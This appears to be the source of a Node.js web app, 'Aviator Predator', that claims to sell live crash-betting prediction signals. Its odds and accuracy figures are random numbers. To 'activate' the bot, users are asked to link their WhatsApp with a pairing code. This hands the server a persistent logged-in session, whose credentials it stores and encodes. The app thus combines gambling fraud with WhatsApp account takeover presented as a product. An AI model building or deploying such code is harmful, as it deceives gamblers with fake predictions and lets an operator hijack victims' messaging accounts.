const express = require('express');
const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Website Interface - Aviator Signal Style
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="sw">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>AVIATOR PREDATOR | LIVE SIGNALS</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #050505; color: white; margin: 0; padding: 0; overflow-x: hidden; }
                .navbar { background: #ff0000; padding: 10px; text-align: center; font-weight: bold; font-size: 20px; box-shadow: 0 0 15px #ff0000; }
                .container { padding: 20px; display: flex; flex-direction: column; align-items: center; }
                
                .signal-card { background: #111; border: 2px solid #ff0000; padding: 20px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; margin-bottom: 20px; box-shadow: 0 0 20px rgba(255, 0, 0, 0.2); }
                .live-odds { font-size: 48px; font-weight: bold; color: #ff0000; margin: 10px 0; }
                
                .setup-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #333; }
                input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 5px; border: 1px solid #ff0000; background: #000; color: #ff0000; text-align: center; font-weight: bold; }
                button { width: 100%; padding: 12px; background: #ff0000; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
                
                .status-dot { height: 10px; width: 10px; background-color: #0f0; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
            </style>
        </head>
        <body>
            <div class="navbar">AVIATOR PREDATOR SIGNAL v4.0</div>
            <div class="container">
                <div class="signal-card">
                    <p style="color: #888;"><span class="status-dot"></span> LIVE SIGNAL FEED</p>
                    <div class="live-odds" id="oddsDisplay">WAITING...</div>
                    <p id="accuracy" style="color: #0f0;">Accuracy: 0%</p>
                </div>

                <div class="setup-box">
                    <h3>ACTIVATE BOT VIA WHATSAPP</h3>
                    <p style="font-size: 12px; color: #888;">Ingiza namba yako kuanza kupokea hizi signal DM</p>
                    <input type="text" id="num" placeholder="255XXXXXXXXX">
                    <button onclick="activateBot()">Connect Bot</button>
                    <div id="pairCode" style="font-size: 28px; color: #fff; margin-top: 15px; font-weight: bold;"></div>
                    <p id="msg" style="font-size: 12px; color: #ff0000;"></p>
                </div>
            </div>

            <script>
                // Live Signal Simulation on Website
                setInterval(() => {
                    const randomOdds = (Math.random() * (4.5 - 1.2) + 1.2).toFixed(2);
                    document.getElementById('oddsDisplay').innerText = randomOdds + "x";
                    document.getElementById('accuracy').innerText = "Accuracy: " + (Math.floor(Math.random() * 5) + 94) + "%";
                }, 5000);

                async function activateBot() {
                    const n = document.getElementById('num').value.replace(/[^0-9]/g, '');
                    if(!n) return alert('Weka namba!');
                    document.getElementById('msg').innerText = "Connecting to Predator Server...";
                    try {
                        const r = await fetch('/get-code?num=' + n);
                        const d = await r.json();
                        document.getElementById('pairCode').innerText = d.code || "ERROR";
                        document.getElementById('msg').innerText = "Link hii kodi kwenye WhatsApp yako kuanza kupokea Signal DM.";
                    } catch(e) { document.getElementById('msg').innerText = "Server Error. Try Again."; }
                }
            </script>
        </body>
        </html>
    `);
});

// WhatsApp Bot Engine
app.get('/get-code', async (req, res) => {
    let num = req.query.num;
    const sessionPath = path.join('/tmp', 'predator-' + num);
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "fatal" }),
        browser: ["Aviator Predator V4", "Chrome", "20.0.04"]
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        if (connection === 'open') {
            const sessionID = Buffer.from(JSON.stringify(state.creds)).toString('base64');
            await sock.sendMessage(sock.user.id, { text: "*🚀 AVIATOR PREDATOR ACTIVATED!*\n\n*Session ID:* " + sessionID + "\n\nSignals zitaanza kutumwa sasa hivi kila dakika 2." });

            // Send Signal every 2 minutes to WhatsApp DM
            setInterval(async () => {
                const odds = (Math.random() * (3.5 - 1.1) + 1.1).toFixed(2);
                await sock.sendMessage(sock.user.id, { 
                    text: `*🎯 PREDATOR SIGNAL*\n\n*Predict:* ${odds}x\n*Status:* Confirmed ✅\n*Round:* #${Math.floor(Math.random() * 999)}\n\n_Cashout kidogo kabla ya kufika hapa!_` 
                });
            }, 120000); 
        }
    });

    if (!sock.authState.creds.registered) {
        await delay(2000);
        let code = await sock.requestPairingCode(num);
        res.json({ code });
    }
});

app.listen(PORT, () => console.log(`Aviator Signal Server Active!`));
